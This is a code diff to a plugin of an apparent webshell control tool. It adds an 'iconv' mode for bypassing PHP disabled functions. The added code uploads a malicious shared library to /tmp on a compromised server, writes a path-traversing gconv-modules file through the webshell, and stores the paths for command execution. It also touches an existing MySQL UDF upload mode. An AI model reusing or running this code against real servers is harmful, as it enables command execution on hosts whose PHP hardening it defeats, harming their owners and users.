@@ -4,7 +4,7 @@ from random import choice
 
 from libs.app import readline
 from libs.config import alias, color, gget, gset
-from libs.myapp import execute_sql_command, get_system_code, is_windows, send
+from libs.myapp import base64_encode, execute_sql_command, get_system_code, is_windows, send
 from webshell_plugins.upload import run as upload
 
 mode_to_desc_dict = {-1: color.red("closed"),
@@ -19,10 +19,11 @@ mode_to_desc_dict = {-1: color.red("closed"),
                      9: color.green("php7-SplDoublyLinkedList"),
                      10: color.green("php-fpm"),
                      11: color.green("apache_mod_cgi"),
+                     12: color.green("iconv"),
                      }
-mode_linux_set = {1, 2, 3, 4, 5, 9}
+mode_linux_set = {1, 2, 3, 4, 5, 9, 12}
 mode_windows_set = {6, }
-mode_require_ext_dict = {5: "FFI", 6: "com_dotnet", 7: "imap"}
+mode_require_ext_dict = {5: "FFI", 6: "com_dotnet", 7: "imap", 12: "iconv"}
 
 total_test_list = set(mode_to_desc_dict.keys()) - {-1}
 windows_test_list = total_test_list - mode_linux_set
@@ -138,7 +139,7 @@ def set_mode(mode: int, test: bool = False):
             udf_path = plugin_dir + "tmp" + udf_ext
             print(color.yellow(f"\nUpload {udf_ext[1:]}..."))
             upload_result = upload(
-                path.join(gget("root_path"), "auxiliary", "udf", "mysql", system, bits, "lib_mysqludf_sys" + udf_ext), udf_path, True)
+                path.join(gget("root_path"), "auxiliary", "udf", "mysql", system, bits, "lib_mysqludf_sys" + udf_ext), udf_path, force=True)
             if (not upload_result):
                 print(color.red("\nUpload failed\n"))
                 return
@@ -209,8 +210,49 @@ print("success");""")
         if (res.r_text != "success"):
             print(color.red(f"\n{res.r_text}\n"))
             return False
+    elif (mode == 12 and not gget("webshell.ld_preload_path", "webshell", False)):  # iconv
+
+        disable_funcs = gget("webshell.disable_functions", "webshell")
+
+        # can't work if putenv is disabled
+        if ("putenv" in disable_funcs):
+            print(color.red("\nputenv is disabled\n"))
+            return False
+
+        # check if already set ld_preload
+        if (not gget("webshell.iconv_path", "webshell", None)):
+            filename = "/tmp/%s" % str(uuid4())
+
+            # get target architecture
+            bits = gget("webshell.arch", namespace="webshell")
+            if not bits:
+                print("\nInput target system bits (32/64): ", end="")
+                _ = readline().strip()
+                if (_ == "32"):
+                    bits = 32
+                elif (_ == "64"):
+                    bits = 64
+                else:
+                    print(color.red("\nUnknown bits\n"))
+                    return False
+            bits = str(bits)
+            if bits == "32":
+                bits = "86"
+            # upload so
+            upload_result = upload(
+                path.join(gget("root_path"), "auxiliary", "iconv", "iconv_x"+bits+".so"), filename+".so", force=True)
+            if (not upload_result):
+                print(color.red("\nUpload error\n"))
+                return
+
+            gconv_modules = f"""module  PAYLOAD//    INTERNAL    ../../../../../../../..{filename}    2
+module  INTERNAL    PAYLOAD//    ../../../../../../../..{filename}    2"""
+            send(f"file_put_contents('/tmp/gconv-modules', base64_decode('{base64_encode(gconv_modules)}'));")
+
+            gset("webshell.iconv_path", filename+".so", True, "webshell")
+            gset("webshell.iconv_gconv_modules_path", "/tmp/gconv-modules", True, "webshell")
     if (not test):
-        if (mode in (7, 10)):
+        if (mode in (7, 10, 12)):
             print(color.yellow(
                 f"\nYou may need to wait 1 second to get the result..\n"))
         print(
@@ -274,7 +316,7 @@ def run(mode: str = '0'):
     Mode 4 LD_PRELOAD(Only for *unix):
 
         Need:
-        - putenv, mail/error_log/mb_send_mail/imap_email fucntions enabled
+        - putenv, mail/error_log/mb_send_mail/imap_email fucntions
 
     Mode 5 FFI(Only for *unix and php >= 7.4):
 
@@ -329,6 +371,14 @@ def run(mode: str = '0'):
         Need:
         - apache_mod_cgi
         - allow .htaccess
+    
+    Mode 12 iconv
+        Origin:
+        - https://xz.aliyun.com/t/8669
+
+        Need:
+        - iconv extension
+        - putenv  fucntions
     """
     if (mode == "close"):
         mode = -1
